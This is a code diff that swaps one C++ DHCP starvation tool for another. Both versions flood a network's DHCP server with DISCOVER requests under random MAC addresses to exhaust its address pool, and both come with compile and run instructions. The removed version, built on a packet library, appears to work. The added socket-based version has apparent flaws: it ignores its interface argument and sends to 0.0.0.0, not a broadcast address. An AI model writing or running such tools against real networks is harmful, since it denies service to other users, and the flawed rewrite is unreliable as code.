@@ -1,56 +1,101 @@
-// ============================================================
-// dhcp_starve.cpp — exhaust DHCP pool with random MACs
-// ------------------------------------------------------------
-// Compile: clang++ -std=c++17 -O2 -o dhcp_starve dhcp_starve.cpp \
-//          -I/opt/homebrew/include -L/opt/homebrew/lib \
-//          -lPcap++ -lPacket++ -lCommon++ -lpcap
-// Usage:   sudo ./dhcp_starve <iface> <count>
-// ============================================================
-#include "PcapLiveDeviceList.h"
-#include "EthLayer.h"
-#include "IPv4Layer.h"
-#include "UdpLayer.h"
-#include "PayloadLayer.h"
-#include "Packet.h"
-#include <cstdio>
+// Compile: g++ -o dhcp_starve dhcp_starve.cpp
+// Run: sudo ./dhcp_starve <interface>
+// Requires: root privileges
+
+#include <iostream>
+#include <cstring>
 #include <cstdlib>
-#include <random>
+#include <ctime>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 #include <unistd.h>
+#include <random>
 
-int main(int argc, char** argv) {
-    if (argc < 3) return 1;
-    auto* dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(argv[1]);
-    if (!dev || !dev->open()) return 1;
-
-    std::mt19937 rng{std::random_device{}()};
-    int count = std::atoi(argv[2]);
-
-    // DHCP DISCOVER payload (simplified)
-    uint8_t dhcp[244] = {0};
-    dhcp[0] = 1; // bootp op = request
-    dhcp[1] = 1; dhcp[2] = 6; // htype=eth, hlen=6
-    dhcp[236] = 0x63; dhcp[237] = 0x82; dhcp[238] = 0x53; dhcp[239] = 0x63;
-    dhcp[240] = 53; dhcp[241] = 1; dhcp[242] = 1; // msg type = DISCOVER
-    dhcp[243] = 255;
-
-    for (int i = 0; i < count; i++) {
-        pcpp::MacAddress mac(
-            (uint8_t)(rng() & 0xff), (uint8_t)(rng() & 0xff),
-            (uint8_t)(rng() & 0xff), (uint8_t)(rng() & 0xff),
-            (uint8_t)(rng() & 0xff), (uint8_t)(rng() & 0xff));
-        memcpy(dhcp + 28, mac.getRawData(), 6);
-
-        pcpp::EthLayer eth(mac, pcpp::MacAddress("ff:ff:ff:ff:ff:ff"), PCPP_ETHERTYPE_IP);
-        pcpp::IPv4Layer ip(pcpp::IPv4Address("0.0.0.0"), pcpp::IPv4Address("255.255.255.255"));
-        pcpp::UdpLayer udp(68, 67);
-        pcpp::PayloadLayer pay(dhcp, sizeof(dhcp), false);
-
-        pcpp::Packet pkt(100);
-        pkt.addLayer(&eth); pkt.addLayer(&ip);
-        pkt.addLayer(&udp); pkt.addLayer(&pay);
-        pkt.computeCalculateFields();
-        dev->sendPacket(&pkt);
+class DHCPStarvation {
+private:
+    int sock;
+    
+    std::string randomMAC() {
+        std::random_device rd;
+        std::mt19937 gen(rd());
+        std::uniform_int_distribution<> dis(0, 255);
+        
+        char mac[18];
+        snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x",
+                 dis(gen), dis(gen), dis(gen), dis(gen), dis(gen), dis(gen));
+        return std::string(mac);
     }
-    std::printf("[+] sent %d DISCOVERs\n", count);
+    
+public:
+    DHCPStarvation() {
+        sock = socket(AF_INET, SOCK_DGRAM, 0);
+        if (sock < 0) { perror("socket"); exit(1); }
+        
+        int opt = 1;
+        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
+        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+        
+        struct sockaddr_in addr;
+        addr.sin_family = AF_INET;
+        addr.sin_addr.s_addr = INADDR_ANY;
+        addr.sin_port = htons(68);
+        
+        bind(sock, (struct sockaddr*)&addr, sizeof(addr));
+    }
+    
+    void starve(int count) {
+        struct sockaddr_in broadcast;
+        broadcast.sin_family = AF_INET;
+        broadcast.sin_port = htons(67);
+        broadcast.sin_addr.s_addr = INADDR_ANY;
+        
+        for (int i = 0; i < count; i++) {
+            char packet[1024];
+            memset(packet, 0, sizeof(packet));
+            
+            packet[0] = 1;  // Boot request
+            packet[1] = 1;  // Ethernet
+            packet[2] = 6;  // MAC length
+            packet[3] = 0;  // Hops
+            
+            // Random transaction ID
+            *(uint32_t*)(packet + 4) = rand();
+            
+            // Random MAC
+            std::string mac = randomMAC();
+            sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+                   &packet[28], &packet[29], &packet[30],
+                   &packet[31], &packet[32], &packet[33]);
+            
+            // Magic cookie
+            packet[236] = 0x63;
+            packet[237] = 0x82;
+            packet[238] = 0x53;
+            packet[239] = 0x63;
+            
+            // DHCP Discover
+            packet[240] = 0x35;
+            packet[241] = 0x01;
+            packet[242] = 0x01;
+            
+            // End
+            packet[243] = 0xFF;
+            
+            sendto(sock, packet, 244, 0, 
+                   (struct sockaddr*)&broadcast, sizeof(broadcast));
+            
+            usleep(10000);
+        }
+    }
+    
+    ~DHCPStarvation() { close(sock); }
+};
+
+int main(int argc, char* argv[]) {
+    if (argc != 2) { std::cerr << "Usage: " << argv[0] << " <interface>\n"; return 1; }
+    srand(time(NULL));
+    DHCPStarvation starve;
+    starve.starve(1000);
     return 0;
 }
